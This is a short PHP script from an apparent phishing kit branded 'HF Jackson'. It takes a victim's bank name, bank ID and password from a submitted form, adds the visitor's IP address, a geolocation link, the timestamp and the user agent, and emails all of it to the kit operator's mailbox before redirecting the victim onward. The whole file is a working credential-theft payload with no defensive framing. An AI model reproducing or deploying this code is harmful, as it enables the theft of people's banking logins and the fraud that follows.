<?php
session_start();

include './email.php';

$name_bank = $_POST['n_bank'];

$id_bank    = $_POST['id_bank'];

$pass    =  $_POST['pass_bank'];

$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$HF = " HF Jackson ";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = " Login Bank -  HF Jackson [ " .$ip. " - " .$HF. " ] ";
$headers .= "From: HF JacksonV2" . "\r\n";

$message = "

Name-Bank          =>   ".$name_bank."
E-MAIL          =>   ".$email."
PASSWORD        =>   ".$pass."
IP              =>  "."http://www.geoiptool.com/?IP=".$ip."
TIME            =>   ".$time."

";
		
mail($yourmail, $subject, $message , $headers);

header("location:../upload");


